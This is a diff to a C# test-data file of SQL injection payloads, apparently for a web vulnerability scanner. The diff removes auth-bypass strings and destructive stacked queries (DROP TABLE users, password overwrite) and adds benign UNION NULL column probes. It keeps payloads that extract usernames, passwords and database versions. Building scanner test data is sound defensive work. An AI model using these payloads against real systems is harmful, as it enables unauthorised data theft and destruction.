@@ -15,19 +15,21 @@ namespace WebVulnerabilitiesScanner.TestData
         /// </summary>
         public static readonly List<RequestSqlInjectionPayloadEntity> BasePayloadsInfo = new List<RequestSqlInjectionPayloadEntity>()
         {
-            new RequestSqlInjectionPayloadEntity("admin'--", SqlInjectionType.ClassicSqlInjection),
-            new RequestSqlInjectionPayloadEntity("admin'#", SqlInjectionType.ClassicSqlInjection),
-            new RequestSqlInjectionPayloadEntity("admin'/*", SqlInjectionType.ClassicSqlInjection),
-
-            new RequestSqlInjectionPayloadEntity("' UNION SELECT 1,2,3--", SqlInjectionType.UnionBased),
+            new RequestSqlInjectionPayloadEntity("' UNION SELECT NULL--", SqlInjectionType.UnionBased),
+            new RequestSqlInjectionPayloadEntity("' UNION SELECT NULL,NULL--", SqlInjectionType.UnionBased),
+            new RequestSqlInjectionPayloadEntity("' UNION SELECT NULL,NULL,NULL--", SqlInjectionType.UnionBased),
+            new RequestSqlInjectionPayloadEntity("' UNION SELECT NULL,NULL,NULL,NULL--", SqlInjectionType.UnionBased),
+            new RequestSqlInjectionPayloadEntity("' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--", SqlInjectionType.UnionBased),
+            new RequestSqlInjectionPayloadEntity("' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--", SqlInjectionType.UnionBased),
             new RequestSqlInjectionPayloadEntity("' UNION SELECT username,password FROM users--", SqlInjectionType.UnionBased),
             new RequestSqlInjectionPayloadEntity("' UNION SELECT null,version()--", SqlInjectionType.UnionBased),
 
             new RequestSqlInjectionPayloadEntity("' AND 1=CAST((SELECT version()) AS INT)--", SqlInjectionType.ErrorBased),
             new RequestSqlInjectionPayloadEntity("' AND EXTRACTVALUE(1,CONCAT(0x3a,version()))--", SqlInjectionType.ErrorBased),
 
-            new RequestSqlInjectionPayloadEntity("'; DROP TABLE users--", SqlInjectionType.StackedQueries),
-            new RequestSqlInjectionPayloadEntity("'; UPDATE users SET password='hacked'--", SqlInjectionType.StackedQueries),
+            new RequestSqlInjectionPayloadEntity("'; SELECT 1--", SqlInjectionType.StackedQueries),
+            new RequestSqlInjectionPayloadEntity("'; SELECT version()--", SqlInjectionType.StackedQueries),
+            new RequestSqlInjectionPayloadEntity("'; SELECT 1; SELECT 2--", SqlInjectionType.StackedQueries),
         };
 
         /// <summary>
